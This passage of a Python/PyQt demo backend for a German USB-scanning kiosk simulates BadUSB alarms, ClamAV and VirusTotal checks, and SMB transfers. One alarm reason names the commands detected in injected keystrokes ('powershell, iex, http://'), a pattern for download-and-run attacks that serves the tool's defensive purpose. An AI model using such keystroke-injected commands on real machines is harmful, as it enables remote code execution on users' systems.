        self._typed = min(len(DEMO_PAYLOAD), self._typed + 9)
        text = DEMO_PAYLOAD[:self._typed]
        n = self._typed
        a["keys"] = {"keys": n, "text": text, "median_ms": 4.0, "keys_per_min": 15000, "first_key_s": 0.6,
                     "digits": 0, "reasons": []}
        if a["state"] == "probe" and n > 12:
            a.update({"state": "alarm", "blocked": True, "how": "USBGuard (block-device 12)",
                      "message": "Das Gerät hat selbstständig getippt und ist wieder gesperrt."})
            self._log("ALARM: Unbekannt 16d0:0753 tippt selbstständig: Super+R, 15000 Anschläge/min")
            self.history.insert(0, {"id": "", "time": _now_iso(), "device": "Unbekannt 16d0:0753",
                                    "usb_id": "16d0:0753", "files": None, "infected": 0, "result": "BadUSB"})
        if a["state"] == "alarm":
            a["reasons"] = ["Tippt mit etwa 15.000 Anschlägen pro Minute (Abstand 4 ms, ein Mensch braucht "
                            "80–250 ms)", "Erste Taste schon 0.6 s nach dem Zulassen, bevor jemand den Code "
                            "lesen konnte", "Tastenkombination Super+R (Ausführen-Dialog unter Windows)"]
            if n >= len(DEMO_PAYLOAD):
                a["reasons"].append("Befehle im Getippten: powershell, iex, http://")
                self._robot.stop()
                if self.autoplay:
                    QTimer.singleShot(9000, self.unplug_usb)
        self._set(self.st["state"], self.st["message"])

    def usb_dismiss(self, alert_id: str) -> None:
        self._robot.stop()
        if self.st["usb_guard"]["alerts"]:
            self._log("Bestätigt: Unbekannt 16d0:0753 bleibt gesperrt")
        self.st["usb_guard"]["alerts"] = []
        self._set(self.st["state"], self.st["message"])
        if self.autoplay:
            QTimer.singleShot(2500, self.unplug_usb)

    def remove(self) -> None:
        self.st["device"] = None
        self.st["progress"] = None
        self.st["result"] = None
        self.st["findings"] = []
        self.st["transfer"] = None
        self.st["transfer_result"] = None
        self._log("Gerät entfernt")
        self._set("LEERLAUF")
        if self.autoplay:
            self.cycle += 1
            nxt = {1: self.insert_badusb, 3: self.insert_keyboard}.get(self.cycle % 4, self.insert_stick)
            QTimer.singleShot(2500, nxt)

    # -- Aktionen
    def scan(self) -> None:
        self._scans += 1
        self._done = 0
        self._collect = 0
        self.st["findings"] = []
        self.st["result"] = None
        self._log("Prüfung gestartet mit ClamAV 1.4.3 (daily 27801, clamd aktiv)")
        self._set("SCAN", "Prüfung läuft")
        self._timer.start(120)

    def _tick(self) -> None:
        if self._collect < 12:  # erst Dateien suchen, wie der echte Dienst
            self._collect += 1
            p = {"phase": "sammeln", "total": self._collect * 158, "done": 0,
                 "current": f"sdb1/Fotos/2026-{self._collect:02d}"}
            self.st["progress"] = p
            self.progressChanged.emit(p)
            return
        self._done = min(self.TOTAL, self._done + 37)
        files = ["Projekte/Angebot_2026/angebot.docx", "Fotos/IMG_2207.jpg", "tools/setup.exe",
                 "Projekte/Angebot_2026/anhang.zip"]
        cur = f"sdb1/{files[self._done % len(files)]}"
        # Erste Prüfung: auffällige Dateien, aber übertragbar; die zweite mit Virenfund
        infected = 1 if self._scans % 2 == 0 and self._done > self.TOTAL * 0.6 else 0
        if infected and not self.st["findings"]:
            f = {"path": "sdb1/tools/setup.exe", "size": 73_802, "sha256": "e3b0c442…",
                 "status": "infected", "detail": "Win.Trojan.Agent-1234567"}
            self.st["findings"].append(f)
            self._log("FUND Win.Trojan.Agent-1234567 → sdb1/tools/setup.exe")
        shown = 0
        if self._scans % 2 == 1:
            shown = min(len(DEMO_SUSPICIOUS), int(self._done / self.TOTAL * 5))
            for f in DEMO_SUSPICIOUS[len(self.st["findings"]):shown]:
                self.st["findings"].append(copy.deepcopy(f))
                how = "gesperrt" if f["action"] == "blockieren" else "Freigabe nötig"
                self._log(f"AUFFÄLLIG ({how}) {f['detail']} → {f['path']}")
        total_b = 4_812_000_000
        hits = {"olevba": int(shown >= 1), "Dateityp": max(0, shown - 1), "YARA-X": 0}
        p = {"total": self.TOTAL, "done": self._done, "infected": infected, "errors": 0, "skipped": 3,
             "suspicious": shown, "engine_hits": hits,
             "bytes_total": total_b, "bytes_done": int(total_b * self._done / self.TOTAL),
             "current": cur, "elapsed": self._done / 37 * 0.12,
             "eta": (self.TOTAL - self._done) / 37 * 0.12}
        self.st["progress"] = p
        self.progressChanged.emit(p)
        if self._done >= self.TOTAL:
            self._timer.stop()
            susp = len(DEMO_SUSPICIOUS) if not infected else 0
            verdict = "infiziert" if infected else ("auffällig" if susp else "sauber")
            self._released = set()
            counts = {"files": self.TOTAL, "clean": self.TOTAL - infected - susp, "infected": infected,
                      "errors": 0, "skipped": 3, "suspicious": susp, "blocked": 1 if susp else 0,
                      "releasable": susp - 1 if susp else 0, "released": 0, "bytes": total_b}
            self.st["result"] = {"id": "2026-10-29_141502_SanDisk_91A2", "verdict": verdict, "counts": counts,
                                 "started": _now_iso(), "finished": _now_iso(), "duration_s": 6.9}
            self.history.insert(0, {"id": "demo", "time": _now_iso(), "device": "SanDisk Ultra Fit",
                                    "usb_id": "0781:5583", "files": self.TOTAL, "infected": infected,
                                    "suspicious": susp, "result": verdict})
            self._log(f"Prüfung beendet: 1904 Dateien, {infected} infiziert, {susp} auffällig, 0 Fehler → {verdict}")
            if infected:
                msg = "1 Datei mit Schadsoftware gefunden. Der Datenträger ist gesperrt."
            elif susp:
                msg = (f"Keine Schadsoftware gefunden, aber {susp} Dateien sind auffällig (1 gesperrt, "
                       f"{susp - 1} brauchen eine Freigabe). {counts['clean']} saubere Dateien können "
                       "übertragen werden.")
            else:
                msg = f"Keine Schadsoftware gefunden. {self.TOTAL} Dateien geprüft."
            self._vt = {}
            if not infected and self.st["virustotal"]["ready"] and self.st["virustotal"]["mode"] != "manuell":
                self._vt_start("hash", list(DEMO_VT), msg)
            else:
                self._set("ERGEBNIS", msg)

    # -- VirusTotal
    def _vt_start(self, kind: str, paths: list[str], msg: str) -> None:
        self._vt_kind, self._vt_todo, self._vt_msg, self._vt_step = kind, list(paths), msg, 0
        self._vt_done = 0
        self._log(f"VirusTotal: {len(paths)} Dateien {'hochladen' if kind == 'upload' else 'abfragen'} "
                  "(höchstens 4 Anfragen pro Minute)")
        self._log("Netzwerk geöffnet: tcp/443 zu www.virustotal.com (74.125.34.46)")
        self._set("VIRUSTOTAL", "VirusTotal-Abfrage läuft")
        self.st["smb"]["firewall"]["open"] = True   # _set setzt es nur bei UEBERTRAGUNG
        self.statusChanged.emit(copy.deepcopy(self.st))
        self._vtimer.start(250)

    def _vt_progress(self, phase: str, waiting: float = 0.0) -> None:
        total = len(self._vt_todo)
        cur = self._vt_todo[min(self._vt_done, total - 1)] if total else ""
        p = {"kind": "upload" if self._vt_kind == "upload" else "hash", "total": total, "done": self._vt_done,
             "current": cur, "waiting": waiting, "phase": phase,
             "eta": max(0.0, (total - self._vt_done) * 3.0 + waiting)}
        self.st["virustotal"]["progress"] = p
        self.vtChanged.emit(p)

    def _vt_tick(self) -> None:
        self._vt_step += 1
        total = len(self._vt_todo)
        if self._vt_done < total:
            # kurz "warten" wie bei der kostenlosen API (4 pro Minute, zwei schon vorher verbraucht)
            if self._vt_done == 2 and self._vt_step < 20:
                self._vt_progress("abfragen", (20 - self._vt_step) * 0.6)
                return
            path = self._vt_todo[self._vt_done]
            if self._vt_kind == "upload" and DEMO_VT.get(path, {}).get("state", "unknown") == "unknown":
                self._vt[path] = {"state": "uploaded", "how": "upload", "malicious": 0, "suspicious": 0,
                                  "total": 70, "rating": "ok"}
                self._log(f"VirusTotal: hochgeladen {path}")
            else:
                self._vt[path] = {**DEMO_VT.get(path, {"state": "found", "how": "hash", "malicious": 0, "total": 70,
                                                       "rating": "ok"})}
                self._log(f"VirusTotal: {vt_mod.short(self._vt[path])} → {path}")
            for v in self._vt.values():
                v.setdefault("link", "https://www.virustotal.com/gui/file/" + "0" * 64)
                v.setdefault("time", _now_iso())
            self.st["virustotal"]["quota_used"] += 1
            self._vt_done += 1
            self._vt_progress("hochladen" if self._vt_kind == "upload" else "abfragen")
            return
        self._vtimer.stop()
        self._vt_finish()

    def _vt_finish(self) -> None:
        self.st["smb"]["firewall"]["open"] = False
        self.st["virustotal"]["progress"] = None
        self._log("VirusTotal-Verbindung getrennt, Netzwerk wieder gesperrt")
        states = [v.get("state") for v in self._vt.values()]
        rates = [v.get("rating") for v in self._vt.values()]
        summary = {"checked": len(states), "found": sum(1 for x in states if x in ("found", "uploaded")),
                   "unknown": states.count("unknown"), "uploaded": states.count("uploaded"), "pending": 0,
                   "errors": sum(1 for x in states if x in ("error", "limit", "skipped")),
                   "hits": rates.count("hit"), "warn": rates.count("warn"), "error": ""}
        summary["open"] = summary["unknown"] + summary["errors"]
        summary["incomplete"] = summary["errors"]
        res = self.st.get("result") or {}
        res["vt"] = summary
        for f in self.st["findings"]:
            if f["path"] in self._vt:
                f["vt"] = self._vt[f["path"]]
                if f["vt"].get("rating") == "warn":
                    f["notes"] = [f"VirusTotal: {f['vt']['malicious']} von {f['vt']['total']} Engines melden etwas "
                                  "(unter der Schwelle von 3)"]
        self._log(f"VirusTotal fertig: {summary['found']} bekannt, {summary['unknown']} unbekannt, "
                  f"{summary['hits']} gefährlich, {summary['warn']} mit einzelnen Meldungen")
        self._set("ERGEBNIS", self._vt_msg)

    def vt_check(self) -> None:
        open_ = [p for p, v in self._vt.items() if v.get("state") not in ("found", "uploaded")] or list(DEMO_VT)
        self._vt_start("recheck", open_, self.st["message"])

    def vt_upload(self, paths: list[str], notice_confirmed: bool) -> None:
        if not notice_confirmed:
            self.error.emit("Vor dem Upload den Hinweis bestätigen")
            return
        self._log(f"Upload zu VirusTotal freigegeben: {len(paths)} Dateien, Hinweis zur Weitergabe bestätigt")
        self._vt_start("upload", paths, self.st["message"])

    def vt_send(self, paths: list[str], upload: bool, notice_confirmed: bool) -> None:
        if upload:
            self.vt_upload(paths, notice_confirmed)
        else:
            self._log(f"VirusTotal: {len(paths)} ausgewählte Dateien abfragen (nur SHA-256)")
            self._vt_start("select", paths, self.st["message"])

    def vt_cancel(self) -> None:
        self._vtimer.stop()
        for p in self._vt_todo[self._vt_done:]:
            self._vt.setdefault(p, {"state": "skipped", "message": "abgebrochen"})
        self._vt_finish()

    def get_virustotal(self) -> None:
        self.vtConfig.emit(copy.deepcopy(self.st["virustotal"]))

    def set_virustotal(self, data: dict) -> None:
        v = self.st["virustotal"]
        data = dict(data)
        key = data.pop("api_key", None)
        if data.pop("clear_key", False):
            v["has_key"] = False
        if key:
            v["has_key"] = True
        confirm = data.pop("confirm_noncommercial", False)
        if data.get("license") != v.get("license"):
            v["license_confirmed"] = ""
        v.update(data)
        if confirm or (v["license"] == "premium" and not v["license_confirmed"]):
            v["license_confirmed"] = _now_iso()
        if v["mode"] != "aus" and v["license"] == "public" and not v["license_confirmed"]:
            self.error.emit("Die kostenlose Public API ist nur für nicht-kommerzielle Nutzung erlaubt.")
            return
        v["mode_label"] = vt_mod.MODE_LABELS[v["mode"]]
        v["ready"] = v["mode"] != "aus" and v["has_key"]
        v["per_minute"] = 4 if v["license"] == "public" else 0
        v["quota_limit"] = 500 if v["license"] == "public" else 0
        v["message"] = {"aus": "VirusTotal ist aus", "hash": "Nur Hash-Abfrage",
                        "manuell": "Manuell: nichts automatisch, Abfrage und Upload nur auf Knopfdruck"}.get(
            v["mode"], "Hash-Abfrage, Upload nach Bestätigung") if v["has_key"] else "Kein API-Key hinterlegt"
        self._log(f"VirusTotal gespeichert: Stufe {v['mode']}, Lizenz {v['license']}")
        self.vtConfig.emit({**copy.deepcopy(v), "saved": True})
        self._set(self.st["state"], self.st["message"])

    def test_virustotal(self) -> None:
        QTimer.singleShot(1200, lambda: self.vtTested.emit({"ok": True, "message": "Verbindung in Ordnung", "steps": [
            "www.virustotal.com gefunden: 74.125.34.46", "TLS-Zertifikat geprüft, API-Key angenommen",
            "Testabfrage EICAR: 66 von 71 Engines", "Verbindung getrennt, Netzwerk wieder gesperrt",
            f"Heute {self.st['virustotal']['quota_used']} von 500 Anfragen verbraucht"]}))

    def cancel(self) -> None:
        self._timer.stop()
        self.st["progress"] = None
        self._log("Prüfung abgebrochen")
        self._set("EINGEBUNDEN", "Prüfung abgebrochen")

    def eject(self) -> None:
        self._log("Ausgehängt, Gerät abgeschaltet: /dev/sdb")
        self._set("AUSGEWORFEN", "Der Datenträger kann jetzt abgezogen werden.")
        if self.autoplay:
            QTimer.singleShot(2500, self.remove)

    def _sync_smb(self) -> None:
        st = self.store.load()
        self.st["smb"].update({"configured": st.configured, "target": st.display_target(), "server": st.server,
                               "label": st.label(), "targets": len(self.store.targets())})

    def transfer(self, target_id: str = "", files: list[str] | None = None) -> None:
        self._tdone = 0
        self._tcount = len(files) if files is not None else self.TOTAL
        self._ttarget = self.store.load(target_id or None).unc()
        self.st["transfer_result"] = None
        self._log(f"Übertragung freigegeben: {self._tcount} Dateien nach {self._ttarget}")
        self._log("Netzwerk geöffnet: tcp/445 zu 192.168.10.20")
        self._log("Verbunden: SMB 3.1.1, verschlüsselt, angemeldet als firebridge (192.168.10.20)")
        self._set("UEBERTRAGUNG", "Übertragung läuft")
        self._ttimer.start(120)

    def _transfer_tick(self) -> None:
        self._tdone = min(self._tcount, self._tdone + max(1, self._tcount // 45))
        total_b = 4_812_000_000
        rid = self.st["result"]["id"]
        target = f"{self._ttarget}\\{rid}"
        phase = "kopieren" if self._tdone < self._tcount else "trennen"
        p = {"phase": phase, "total": self._tcount, "done": self._tdone, "copied": self._tdone, "failed": 0,
             "bytes_total": total_b, "bytes_done": int(total_b * self._tdone / self._tcount),
             "current": f"sdb1/Fotos/IMG_{2200 + self._tdone % 400}.jpg", "target": target,
             "connection": "SMB 3.1.1, verschlüsselt, angemeldet als firebridge (192.168.10.20)",
             "elapsed": self._tdone / self._tcount * 5.4, "eta": (self._tcount - self._tdone) / self._tcount * 5.4}
        self.st["transfer"] = p
        self.transferChanged.emit(p)
        if self._tdone >= self._tcount:
            self._ttimer.stop()
            self._log("Prüfbericht auf dem Share abgelegt")
            self._log("SMB-Verbindung getrennt, Netzwerk wieder gesperrt")
            msg = f"{self._tcount} Dateien nach {target} übertragen und per SHA-256 gegengeprüft."
            self.st["transfer_result"] = {"verdict": "übertragen", "copied": self._tcount, "failed": 0,
                                          "planned": self._tcount, "target": target, "message": msg,
                                          "duration_s": 27.4, "renamed_count": 2, "verify": True,
                                          "connection": p["connection"]}
            self.history.insert(0, {"id": "demo", "time": _now_iso(), "device": "SanDisk Ultra Fit",
                                    "usb_id": "0781:5583", "files": self._tcount, "infected": 0,
                                    "result": "übertragen"})
            self._set("UEBERTRAGEN", msg)

    def cancel_transfer(self) -> None:
        self._ttimer.stop()
        self.st["transfer_result"] = {"verdict": "Übertragung abgebrochen", "copied": self._tdone,
                                      "message": "Übertragung abgebrochen."}
        self._log("SMB-Verbindung getrennt, Netzwerk wieder gesperrt")
        self._set("ERGEBNIS", "Keine Schadsoftware gefunden.")

    def _emit_share(self, extra: dict | None = None) -> None:
        self._sync_smb()
        self.shareConfig.emit({**self.store.public(), "editable": True, **(extra or {})})
        self._set(self.st["state"], self.st["message"])

    def get_share(self) -> None:
        self.shareConfig.emit({**self.store.public(), "editable": True})

    def set_share(self, data: dict) -> None:
        data = dict(data)
        tid = data.pop("id", None) or None
        pw = data.pop("password", None)
        if data.pop("clear_password", False):
            pw = ""
        default = data.pop("make_default", False)
        try:
            saved = self.store.save(ShareSettings(**data), pw, tid, default)
        except ValueError as exc:
            self.error.emit(str(exc))
            return
        self._log(f"Ziel gespeichert: {self.store.load(saved).label()}")
        self._emit_share({"saved_id": saved})

    def delete_share(self, target_id: str) -> None:
        self.store.delete(target_id)
        self._emit_share()

    def select_share(self, target_id: str) -> None:
        self.store.set_active(target_id)
        self._emit_share()

    def test_share(self, data: dict | None) -> None:
        def done():
            self.shareTested.emit({"ok": True, "message": "Verbindung in Ordnung", "steps": [
                "Server gefunden: 192.168.10.20",
                "SMB 3.1.1, verschlüsselt, angemeldet als firebridge (192.168.10.20)",
                "Ordner vorhanden, Schreiben erlaubt",
                "Verbindung getrennt, Netzwerk wieder gesperrt"]})
        QTimer.singleShot(1200, done)

    def refresh_history(self) -> None:
        self.historyChanged.emit(list(self.history))

    def get_full_history(self, limit: int = 1000) -> None:
        QTimer.singleShot(150, lambda: self.historyFull.emit(list(self.history)[:limit]))

    def get_audit(self, limit: int = 500) -> None:
        QTimer.singleShot(150, lambda: self.auditReady.emit(copy.deepcopy(self.audit[:limit])))

    def get_quarantine(self, limit: int = 2000) -> None:
        QTimer.singleShot(150, lambda: self.quarantineReady.emit(copy.deepcopy(self.quarantine[:limit])))

    def admin_check(self, purpose: str) -> None:
        self.adminConfirmed.emit(purpose)

    def set_kiosk(self, on: bool) -> None:
        self.st["kiosk"] = {"on": on, "available": True, "reason": ""}
        self.kioskChanged.emit(dict(self.st["kiosk"]))
        self._set(self.st["state"], self.st["message"])

    def clear_history(self) -> None:
        n = len(self.history)
        self.history.clear()
        self.quarantine.clear()
        self.audit.insert(0, {"time": _now_iso(), "by": getpass.getuser(), "action": "loeschen", "device": "",
                              "text": f"Verlauf gelöscht: {n} Einträge"})
        self._log(f"Verlauf gelöscht: {n} Einträge")
        self.historyChanged.emit([])
        self.historyFull.emit([])

    def load_transfer_files(self, rid: str) -> None:
        QTimer.singleShot(200, lambda: self.transferFiles.emit(self._demo_report(rid)))

    def release(self, paths: list[str]) -> None:
        self._released = set(paths)
        res = self.st.get("result") or {}
        res.setdefault("counts", {})["released"] = len(self._released)
        for f in self.st["findings"]:
            if f.get("status") == "suspicious" and f.get("action") == "freigabe":
                f["released"] = _now_iso() if f["path"] in self._released else ""
        for p in sorted(self._released):
            self._log(f"Freigegeben: {p}")
            self.audit.insert(0, {"time": _now_iso(), "by": getpass.getuser(), "action": "datei",
                                  "device": DEMO_STICK.get("display_name", ""), "text": f"Datei freigegeben: {p}"})
        self._set(self.st["state"], self.st["message"])

    def set_policy(self, policy: dict) -> None:
        self.st["policy"] = policy_mod.validate(policy)
        self._log("Richtlinie gespeichert")
        self._set(self.st["state"], self.st["message"])

    def update_now(self) -> None:
        self.st["update"] = {**self.st["update"], "running": True}
        self._log("Update der Signaturen und YARA-Regeln gestartet")
        self._set(self.st["state"], self.st["message"])

        def done():
            self.st["update"] = {**self.st["update"], "running": False, "finished": _now_iso()}
            self.st["engine"]["db_time"] = _now_iso()
            self.st["analysis"]["yara"]["compiled"] = _now_iso()
            self._set(self.st["state"], self.st["message"])
        QTimer.singleShot(3000, done)

    def get_report(self, rid: str) -> None:
        self.reportReady.emit(self._demo_report(rid))

    def _demo_report(self, rid: str) -> dict:
        files = [{"path": "sdb1/tools/setup.exe", "size": 73_802, "sha256": "9f2c…",
                  "status": "infected", "detail": "Win.Trojan.Agent-1234567"},
                 {"path": "sdb1/link_zu_etc", "size": 0, "sha256": "", "status": "skipped",
                  "detail": "Symlink → /etc (nicht verfolgt)"}]
        files += [{"path": f"sdb1/Fotos/IMG_{2200 + i}.jpg", "size": 2_400_000 + i, "sha256": f"{i:064x}",
                   "status": "clean", "detail": ""} for i in range(30)]
        files += [{"path": f"sdb1/Projekte/Angebot_2026/{n}", "size": 180_000 + i * 1000, "sha256": f"{i + 99:064x}",
                   "status": "clean", "detail": ""}
                  for i, n in enumerate(("angebot.docx", "kalkulation.xlsx", "anhang.pdf", "notizen.txt"))]
        files += [{"path": "sdb1/Lebenslauf.pdf", "size": 210_000, "sha256": "a" * 64, "status": "clean",
                   "detail": ""}]
        if (self.st.get("result") or {}).get("verdict") == "auffällig":
            files = [f for f in files if f["status"] != "infected"]
            for f in DEMO_SUSPICIOUS:
                f = copy.deepcopy(f)
                if f["path"] in self._released:
                    f["released"] = _now_iso()
                if f["path"] in self._vt:
                    f["vt"] = copy.deepcopy(self._vt[f["path"]])
                files.append(f)
        for f in files:
            if f["path"] in self._vt and "vt" not in f:
                f["vt"] = copy.deepcopy(self._vt[f["path"]])
        verdict = (self.st.get("result") or {}).get("verdict", "infiziert")
        rep = {"id": rid or "demo", "station": "Prüfstation 01", "started": _now_iso(), "finished": _now_iso(),
               "device": DEMO_STICK, "engine": self.st["engine"], "analysis": self.st["analysis"], "verdict": verdict,
               "counts": (self.st.get("result") or {}).get("counts", {}), "files": files}
        vs = (self.st.get("result") or {}).get("vt")
        if vs:
            v = self.st["virustotal"]
            rep["virustotal"] = {**vs, "license": v["license"], "license_confirmed": v["license_confirmed"],
                                 "threshold": v["threshold"], "mode": v["mode"]}
        return rep


# Demo: Admin-Passwort "demo", geschützt wie im echten Dienst
DEMO_ADMIN_PASSWORD = "demo"


def _demo_admin_only(fn):
    def wrapper(self, *args, **kwargs):
        if self._admin_until <= time.monotonic():
            self.adminRequired.emit(lambda: wrapper(self, *args, **kwargs),
                                    "Für diese Aktion braucht es das Admin-Passwort (Demo: demo)")
            return
        self._admin_until = time.monotonic() + 600
        return fn(self, *args, **kwargs)
    return wrapper


def _demo_admin(cls):
    cls._admin_until = 0.0

    def status(self):
        left = max(0, int(self._admin_until - time.monotonic()))
        return {"has_password": True, "root": False, "active_seconds": left}

    def admin_status(self):
        self.adminChanged.emit(status(self))

    def admin_login(self, password, then=None):
        if password != DEMO_ADMIN_PASSWORD:
            self.adminLoginFailed.emit("Passwort falsch")
            return
        self._admin_until = time.monotonic() + 600
        self.audit.insert(0, {"time": _now_iso(), "by": getpass.getuser(), "action": "admin", "device": "",
                              "text": "Als Admin angemeldet"})
        self.adminChanged.emit(status(self))
        if then:
            then()

    def admin_logout(self):
        self._admin_until = 0.0
        self.adminChanged.emit(status(self))

    def admin_set_password(self, password, then=None):
        self.adminChanged.emit(status(self))
        if then:
            then()

    cls.admin_status, cls.admin_login, cls.admin_logout = admin_status, admin_login, admin_logout
    cls.admin_set_password = admin_set_password
    for name in ("release", "usb_allow", "set_policy", "set_share", "delete_share", "select_share",
                 "set_virustotal", "clear_history", "vt_upload", "admin_check", "set_kiosk"):
        setattr(cls, name, _demo_admin_only(getattr(cls, name)))
    return cls


DemoBackend = _demo_admin(DemoBackend)
